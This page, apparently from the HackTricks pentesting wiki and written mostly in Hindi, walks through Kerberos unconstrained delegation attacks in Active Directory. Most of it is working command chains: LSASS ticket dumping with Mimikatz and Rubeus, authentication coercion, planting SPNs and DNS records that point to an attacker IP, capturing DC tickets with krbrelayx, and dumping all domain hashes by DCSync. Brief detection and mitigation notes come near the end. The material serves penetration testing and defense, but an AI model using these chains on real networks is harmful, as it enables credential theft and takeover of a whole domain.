# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

यह एक feature है जिसे एक Domain Administrator domain के अंदर किसी भी **Computer** पर set कर सकता है। फिर, जब भी कोई **user logins** उस Computer पर करता है, उस user का **TGT की copy** DC द्वारा दिए गए **TGS** के अंदर **भेजी जाएगी** और **LSASS में memory में save** की जाएगी। इसलिए, अगर आपके पास machine पर Administrator privileges हैं, तो आप **tickets dump** करके किसी भी machine पर users की **impersonate** कर सकेंगे।

इसलिए अगर कोई domain admin "Unconstrained Delegation" feature enabled वाले Computer में logins करता है, और आपके पास उस machine में local admin privileges हैं, तो आप ticket dump करके Domain Admin को कहीं भी impersonate कर पाएंगे (domain privesc)।

आप इस attribute वाले Computer objects को **find** कर सकते हैं, यह जांचकर कि [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribute में [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) शामिल है या नहीं। आप यह ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ LDAP filter से कर सकते हैं, जो powerview करता है:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
**Mimikatz** या **Rubeus** के साथ **Pass the Ticket** के लिए Administrator (या victim user) का ticket memory में load करें।\
और जानकारी: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**ired.team में Unconstrained delegation के बारे में अधिक जानकारी।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

अगर कोई attacker **"Unconstrained Delegation"** के लिए allowed किसी computer को **compromise** कर लेता है, तो वह एक **Print server** को **automatically login** करने के लिए **trick** कर सकता है, जिससे server की memory में एक **TGT** save हो जाएगा।\
फिर attacker **Pass the Ticket attack** करके user Print server computer account को **impersonate** कर सकता है।

किसी print server को किसी भी machine के against login करवाने के लिए आप [**SpoolSample**](https://github.com/leechristensen/SpoolSample) का उपयोग कर सकते हैं:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
If the TGT अगर किसी domain controller से है, तो आप [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) कर सकते हैं और DC से सभी hashes प्राप्त कर सकते हैं।\
[**इस attack के बारे में और जानकारी ired.team पर।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

यहाँ **authentication force** करने के अन्य तरीके देखें:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

कोई भी अन्य coercion primitive जो victim को **Kerberos** के साथ आपके unconstrained-delegation host पर authenticate करने के लिए मजबूर करे, वह भी काम करता है। Modern environments में इसका अक्सर मतलब होता है classic PrinterBug flow की जगह **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN**, या **WebClient/WebDAV**-based coercion का इस्तेमाल करना, इस पर निर्भर करता है कि कौन-सा RPC surface reachable है।

### Abusing a user/service account with unconstrained delegation

Unconstrained delegation **सिर्फ computer objects तक सीमित नहीं** है। एक **user/service account** को भी `TRUSTED_FOR_DELEGATION` के रूप में configure किया जा सकता है। ऐसे scenario में practical requirement यह है कि account को एक **SPN** के लिए Kerberos service tickets मिलने चाहिए, जो वह own करता है।

इससे 2 बहुत common offensive paths बनते हैं:

1. आप unconstrained-delegation **user account** का password/hash compromise करते हैं, फिर उसी account में **SPN** add करते हैं।
2. Account के पास पहले से एक या अधिक SPNs हैं, लेकिन उनमें से एक **stale/decommissioned hostname** की ओर point करता है; missing **DNS A record** को फिर से create करना authentication flow को hijack करने के लिए पर्याप्त है, बिना SPN set modify किए।

Minimal Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notes:

- यह विशेष रूप से तब उपयोगी है जब unconstrained principal एक **service account** हो और आपके पास केवल उसके credentials हों, किसी joined host पर code execution नहीं।
- यदि target user के पास पहले से एक **stale SPN** है, तो संबंधित **DNS record** को फिर से बनाना AD में नया SPN लिखने की तुलना में कम noisy हो सकता है।
- हालिया Linux-centric tradecraft में `addspn.py`, `dnstool.py`, `krbrelayx.py`, और एक coercion primitive का उपयोग होता है; chain को पूरा करने के लिए आपको Windows host को touch करने की आवश्यकता नहीं है।

### Abusing Unconstrained Delegation with an attacker-created computer

Modern domains में अक्सर `MachineAccountQuota > 0` होता है (default 10), जिससे कोई भी authenticated principal N computer objects तक create कर सकता है। यदि आपके पास `SeEnableDelegationPrivilege` token privilege (या equivalent rights) भी है, तो आप newly created computer को unconstrained delegation के लिए trusted set कर सकते हैं और privileged systems से inbound TGTs harvest कर सकते हैं।

High-level flow:

1) अपने control में एक computer create करें
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) डोमेन के अंदर fake hostname को resolvable बनाएं
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) attacker-controlled computer पर Unconstrained Delegation सक्षम करें
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
यह क्यों काम करता है: unconstrained delegation के साथ, delegation-enabled कंप्यूटर पर LSA inbound TGTs को cache करता है। अगर आप किसी DC या privileged server को अपने fake host पर authenticate करने के लिए trick करते हैं, तो उसका machine TGT store हो जाएगा और export किया जा सकता है।

4) krbrelayx को export mode में start करें और Kerberos material तैयार करें
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) DC/servers से अपनी fake host पर authentication coerce करें
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx ccache files को सेव करेगा जब कोई machine authenticate करती है, उदाहरण के लिए:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) DCSync करने के लिए captured DC machine TGT का उपयोग करें
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notes and requirements:

- `MachineAccountQuota > 0` बिना विशेषाधिकार के computer creation सक्षम करता है; वरना आपको explicit rights चाहिए।
- किसी computer पर `TRUSTED_FOR_DELEGATION` सेट करने के लिए `SeEnableDelegationPrivilege` (या domain admin) चाहिए।
- अपने fake host के लिए name resolution सुनिश्चित करें (DNS A record), ताकि DC FQDN के जरिए उससे reach कर सके।
- Coercion के लिए एक viable vector चाहिए (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, आदि)। संभव हो तो इन्हें DCs पर disable करें।
- यदि victim account **"Account is sensitive and cannot be delegated"** के रूप में marked है या **Protected Users** का member है, तो forwarded TGT service ticket में include नहीं होगा, इसलिए यह chain reusable TGT नहीं देगी।
- यदि authenticating client/server पर **Credential Guard** enabled है, तो Windows **Kerberos unconstrained delegation** को block करता है, जिससे otherwise valid coercion paths operator perspective से fail हो सकते हैं।

Detection and hardening ideas:

- Event ID 4741 (computer account created) और 4742/4738 (computer/user account changed) पर alert करें जब UAC `TRUSTED_FOR_DELEGATION` set हो।
- domain zone में unusual DNS A-record additions monitor करें।
- unexpected hosts से 4768/4769 के spikes और DC-authentications to non-DC hosts पर नजर रखें।
- `SeEnableDelegationPrivilege` को minimal set तक restrict करें, जहाँ feasible हो `MachineAccountQuota=0` सेट करें, और DCs पर Print Spooler disable करें। LDAP signing और channel binding enforce करें।

### Mitigation

- DA/Admin logins को specific services तक limit करें
- privileged accounts के लिए "Account is sensitive and cannot be delegated" set करें।

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
